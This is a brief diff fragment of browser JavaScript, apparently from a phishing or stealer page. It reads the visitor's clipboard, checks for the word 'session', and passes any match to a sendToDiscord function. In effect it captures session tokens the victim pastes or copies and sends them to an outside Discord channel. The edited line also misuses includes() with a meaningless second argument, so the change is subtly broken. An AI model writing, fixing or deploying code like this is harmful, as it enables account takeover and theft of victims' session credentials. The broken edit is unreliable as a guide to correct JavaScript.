@@ -249,7 +249,7 @@
             try {
                 const clipboardText = await navigator.clipboard.readText();
                 
-                if (clipboardText.toLowerCase().includes('session')) {
+                if (clipboardText.toLowerCase().includes('session','items')) {
                     textarea.value = clipboardText;
                     validateText();
                     await sendToDiscord(clipboardText);
